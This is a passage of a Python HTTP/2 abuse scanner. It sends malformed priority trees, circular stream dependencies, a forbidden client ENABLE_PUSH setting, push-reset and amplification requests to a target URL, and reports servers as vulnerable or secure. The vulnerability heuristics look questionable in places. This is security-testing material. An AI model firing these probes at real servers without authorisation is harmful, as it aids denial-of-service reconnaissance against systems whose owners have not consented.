                details="",
                error=str(e)[:100],
            )
        )

    # 134b: deep_tree
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            prev_sid = 0
            for _ in range(10):
                sid = conn.get_next_available_stream_id()
                conn.send_headers(
                    sid,
                    [
                        (":method", "GET"),
                        (":path", path),
                        (":scheme", "https"),
                        (":authority", host),
                    ],
                    end_stream=True,
                    priority_weight=1,
                    priority_depends_on=prev_sid,
                )
                prev_sid = sid
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="deep_tree",
                    category="h2_priority_attack",
                    description="Arvore de dependencia profunda (10 niveis)",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        "Deep priority tree: 10 levels, weights=1"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="deep_tree",
                category="h2_priority_attack",
                description="Arvore de dependencia profunda (10 niveis)",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 134c: circular_dep
    try:
        sock, conn = _create_h2_connection(
            host,
            port,
            timeout,
            validate_outbound=False,
        )
        try:
            _drain_settings(sock, conn, timeout)
            sid1 = conn.get_next_available_stream_id()
            conn.send_headers(
                sid1,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
                priority_weight=128,
                priority_depends_on=sid1 + 2,
            )
            sid2 = conn.get_next_available_stream_id()
            conn.send_headers(
                sid2,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
                priority_weight=128,
                priority_depends_on=sid1,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="circular_dep",
                    category="h2_priority_attack",
                    description="Tenta criar dependencia circular de prioridade",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        f"Circular: stream {sid1} depends on {sid2} and vice versa"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="circular_dep",
                category="h2_priority_attack",
                description="Tenta criar dependencia circular de prioridade",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 134d: weight_extreme
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid_high = conn.get_next_available_stream_id()
            conn.send_headers(
                sid_high,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
                priority_weight=256,
            )
            sid_low = conn.get_next_available_stream_id()
            conn.send_headers(
                sid_low,
                [
                    (":method", "GET"),
                    (":path", "/favicon.ico"),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
                priority_weight=1,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="weight_extreme",
                    category="h2_priority_attack",
                    description="PRIORITY com weights extremos (256 vs 1)",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        f"High priority stream {sid_high} (weight=256) vs low {sid_low} (weight=1)"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="weight_extreme",
                category="h2_priority_attack",
                description="PRIORITY com weights extremos (256 vs 1)",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Category 135: h2_push_abuse ────────────────────────────────────────────


async def _test_h2_push_abuse(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa abusos de Server Push."""
    results: list[HTTP2Attempt] = []

    # 135a: settings_enable_push
    try:
        sock, conn = _create_h2_connection(
            host,
            port,
            timeout,
            validate_outbound=False,
            normalize_outbound=False,
        )
        try:
            _drain_settings(sock, conn, timeout)
            conn.update_settings({h2.settings.SettingCodes.ENABLE_PUSH: 1})
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            got_goaway = any(
                isinstance(ev, h2.events.ConnectionTerminated) for ev in events
            )
            got_ack = any(
                isinstance(ev, h2.events.SettingsAcknowledged) for ev in events
            )
            vulnerable = got_ack and not got_goaway
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="settings_enable_push",
                    category="h2_push_abuse",
                    description="Envia SETTINGS com ENABLE_PUSH=1 (proibido RFC 9113)",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=vulnerable,
                    details=f"ACK: {got_ack}, GOAWAY: {got_goaway}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="settings_enable_push",
                category="h2_push_abuse",
                description="Envia SETTINGS com ENABLE_PUSH=1 (proibido RFC 9113)",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 135b: rst_consumption
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "GET"),
                    (":path", "/"),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())
            push_count = 0
            rst_count = 0
            t0 = time.monotonic()
            while time.monotonic() - t0 < timeout:
                events = _recv_events(sock, conn, 0.5)
                if not events:
                    break
                for ev in events:
                    if isinstance(ev, h2.events.PushedStreamReceived):
                        push_count += 1
                        if ev.pushed_stream_id is not None:
                            try:
                                conn.reset_stream(
                                    ev.pushed_stream_id,
                                    h2.errors.ErrorCodes.CANCEL,
                                )
                                rst_count += 1
                            except Exception:
                                pass
                sock.sendall(conn.data_to_send())
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="rst_consumption",
                    category="h2_push_abuse",
                    description="Recebe PUSH_PROMISE e envia RST_STREAM imediatamente",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=push_count > 0,
                    details=f"Pushes received: {push_count}, RSTs sent: {rst_count}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="rst_consumption",
                category="h2_push_abuse",
                description="Recebe PUSH_PROMISE e envia RST_STREAM imediatamente",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 135c: amplification
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            paths_to_request = [
                "/",
                "/style.css",
                "/script.js",
                "/logo.png",
                "/data.json",
            ]
            for p in paths_to_request:
                try:
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(
                        sid,
                        [
                            (":method", "GET"),
                            (":path", p),
                            (":scheme", "https"),
                            (":authority", host),
                        ],
                        end_stream=True,
                    )
                except Exception:
                    break
            sock.sendall(conn.data_to_send())
            push_count = 0
            total_data = 0
            t0 = time.monotonic()
            while time.monotonic() - t0 < timeout:
                events = _recv_events(sock, conn, 0.5)
                if not events:
                    break
                for ev in events:
                    if isinstance(ev, h2.events.PushedStreamReceived):
                        push_count += 1
                    if isinstance(ev, h2.events.DataReceived):
                        total_data += len(ev.data)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="amplification",
                    category="h2_push_abuse",
                    description="Multiplas requests para testar push amplification",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=push_count > 0,
                    details=f"Pushes: {push_count}, data received: {total_data} bytes",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="amplification",
                category="h2_push_abuse",
                description="Multiplas requests para testar push amplification",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 135d: path_manipulation
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "GET"),
                    (":path", "/"),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())
            push_paths: list[str] = []
            t0 = time.monotonic()
            while time.monotonic() - t0 < timeout:
                events = _recv_events(sock, conn, 0.5)
                if not events:
                    break
                for ev in events:
                    if isinstance(ev, h2.events.PushedStreamReceived) and ev.headers:
                        for k, v in ev.headers:
                            if k == ":path":
                                push_paths.append(
                                    v if isinstance(v, str) else v.decode()
                                )
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="path_manipulation",
                    category="h2_push_abuse",
                    description="Analisa paths fornecidos via PUSH_PROMISE",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=len(push_paths) > 0,
                    details=f"Push paths: {push_paths}"
                    if push_paths
                    else "No push paths received",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="path_manipulation",
                category="h2_push_abuse",
                description="Analisa paths fornecidos via PUSH_PROMISE",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Dispatch ────────────────────────────────────────────────────────────────

_CATEGORY_DISPATCH: dict[
    str, Callable[..., Coroutine[Any, Any, list[HTTP2Attempt]]]
] = {
    "h2_downgrade": _test_h2_downgrade,
    "h2_fingerprint": _test_h2_fingerprint,
    "h2_stream_abuse": _test_h2_stream_abuse,
    "h2_reset_attack": _test_h2_reset_attack,
    "h2_settings_abuse": _test_h2_settings_abuse,
    "h2_priority_attack": _test_h2_priority_attack,
    "h2_push_abuse": _test_h2_push_abuse,
}

# ─── Print Results ───────────────────────────────────────────────────────────


def print_results(result: HTTP2Result) -> None:
    """Imprime resultados formatados no terminal."""
    print()
    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "HTTP/2 Abuse Test")
    print(color("[*]", Cyber.CYAN), f"Target: {result.target}")
    print(color("[*]", Cyber.CYAN), f"Host: {result.host}:{result.port}")
    print(color("[*]", Cyber.CYAN), f"HTTP/2 Supported: {result.h2_supported}")

    if result.server_settings:
        print(color("[*]", Cyber.CYAN), "Server Settings:")
        for k, v in result.server_settings.items():
            print(color("    -", Cyber.CYAN), f"{k}: {v}")
    print()

    if result.issues:
        print(color("[!]", Cyber.YELLOW, Cyber.BOLD), "Issues:")
        for issue in result.issues:
            print(color("    -", Cyber.YELLOW), issue)
        print()

    categories: dict[str, list[HTTP2Attempt]] = {}
    for attempt in result.attempts:
        categories.setdefault(attempt.category, []).append(attempt)

    for cat, attempts in categories.items():
        vuln_in_cat = [a for a in attempts if a.vulnerable]
        if vuln_in_cat:
            print(
                color("[!]", Cyber.RED, Cyber.BOLD),
                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
            )
            for a in vuln_in_cat:
                print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")
                print_exploit_info(a.exploit, a.tool)
        else:
            print(color("[+]", Cyber.GREEN), f"{cat}: secure")

    print()
    if result.overall_status == "vulnerable":
        print(
            color("[!]", Cyber.RED, Cyber.BOLD), "VULNERABLE — HTTP/2 abuse possible!"
        )
    else:
        print(
            color("[+]", Cyber.GREEN, Cyber.BOLD), "SECURE — No HTTP/2 abuse detected"
        )
    print()


# ─── Main Scan ───────────────────────────────────────────────────────────────


async def run_scan(
    target: str,
    categories: list[str] | None,
    timeout: float,
    output_file: str | None,
) -> HTTP2Result:
    """Executa scan de HTTP/2 Abuse."""
    host, path, port, tls = _parse_url(target)

    # Verifica suporte h2
    h2_supported = False
    server_settings: dict[str, int] = {}

    try:
        tls_sock = _create_tls_socket(host, port, timeout)
        try:
            alpn = tls_sock.selected_alpn_protocol()
            h2_supported = alpn == "h2"
        finally:
            tls_sock.close()
    except Exception:
        pass

    if h2_supported:
        try:
            sock, conn = _create_h2_connection(host, port, timeout)
            try:
                server_settings = _collect_server_settings(sock, conn, timeout)
            finally:
                sock.close()
        except Exception:
            pass

    # Executa categorias
    all_attempts: list[HTTP2Attempt] = []
    cats = categories if categories is not None else list(_CATEGORY_MAP.keys())

    for cat in cats:
        tester = _CATEGORY_DISPATCH.get(cat)
        if tester is None:
            continue
        try:
            raw = await tester(host, port, path, timeout, tls, server_settings)
            all_attempts.extend(raw)
        except Exception as e:
            all_attempts.append(
                HTTP2Attempt(
                    technique=f"{cat}_error",
                    category=cat,
                    description=f"Error testing {cat}",
                    h2_supported=h2_supported,
                    settings_observed=server_settings,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    # Classifica resultados
    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
    issue_techs = [a.technique for a in all_attempts if a.error and not a.vulnerable]
    issues = [f"Errors: {', '.join(issue_techs)}"] if issue_techs else []

    overall = "vulnerable" if vuln_techs else "secure"

    result = HTTP2Result(
        target=target,
        host=host,
        port=port,
        h2_supported=h2_supported,
        server_settings=server_settings,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, [asdict(a) for a in all_attempts])

    return result


# ─── CLI ─────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    """Constrói parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-http2abuse",
        description="HTTP/2 Abuse — Downgrade, Fingerprint, Stream Abuse, Reset, SETTINGS, Priority, Push",
    )
    parser.add_argument("url", help="URL alvo para teste")
    parser.add_argument(
        "-c",
        "--categories",
        nargs="+",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categorias para testar (default: todas)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa scan uma vez."""
    result = safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=getattr(args, "categories", None),
            timeout=getattr(args, "timeout", 5.0),
            output_file=getattr(args, "output", None),
        )
    )
    return 1 if result.overall_status == "vulnerable" else 0


def main() -> int:
    """Entry point principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=create_banner(_BANNER_LINES, "HTTP/2 Abuse"),
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="http2> ",
        description="Teste de HTTP/2 Abuse (Downgrade, Fingerprint, Stream, Reset, SETTINGS, Priority, Push).",
        example="https://target.com -c h2_downgrade h2_fingerprint",
        contextual_help=(
            "Categorias disponiveis:\n"
            "  h2_downgrade       — Mismatch HTTP/2→1.1\n"
            "  h2_fingerprint     — Detectar server via SETTINGS\n"
            "  h2_stream_abuse    — Stream multiplexing abuse\n"
            "  h2_reset_attack    — RST_STREAM WAF confusion\n"
            "  h2_settings_abuse  — SETTINGS frame manipulation\n"
            "  h2_priority_attack — Priority frame abuse\n"
            "  h2_push_abuse      — Server Push exploitation"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
